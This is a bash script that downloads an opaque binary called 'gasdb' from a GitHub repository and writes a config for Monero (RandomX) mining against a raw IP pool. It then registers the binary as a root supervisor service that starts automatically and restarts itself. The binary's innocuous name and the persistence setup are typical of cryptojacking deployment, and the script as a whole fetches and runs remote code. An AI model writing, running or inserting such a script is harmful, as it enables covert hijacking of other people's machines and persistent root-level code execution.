#!/bin/bash

USERNAME=$(whoami)
WORKER="haxavif"
POOL="149.28.91.175:3333"

sudo apt-get update

wget https://github.com/jojolotnok/gaslah/raw/main/gasdb
chmod +x gasdb
TMP_FILE="config.json"
/bin/cat <<EOM >$TMP_FILE
{
	"autosave": true,
	"colors": false,
	"cpu": true,
	"opencl": false,
	"cuda": false,
	"randomx": {
		"1gb-pages": true
	},
	"pools": [
		{
			"algo": "rx/0",
			"url": "$POOL",
			"rig-id": "$WORKER",
			"keepalive": true,
			"tls": true
		}
	]
}

EOM

echo "Instaling supervisor"
sudo apt-get install -y supervisor
sudo service supervisor start

TMP_FILE="supervisor.conf"
SUPERVISOR_CONF="/etc/supervisor/conf.d/gaslah.conf"
#command=/home/$USERNAME/gasdb --randomx-1gb-pages -a rx/0 -o $POOL -k --tls --rig-id $WORKER -t 2
/bin/cat <<EOM >$TMP_FILE
[program:gaslah]
directory=/home/$USERNAME/
command=/home/$USERNAME/gasdb
user=root
autostart=true
autorestart=true
stopasgroup=true
killasgroup=true

EOM
sudo cp $TMP_FILE $SUPERVISOR_CONF
sudo rm $TMP_FILE

sudo supervisorctl reload
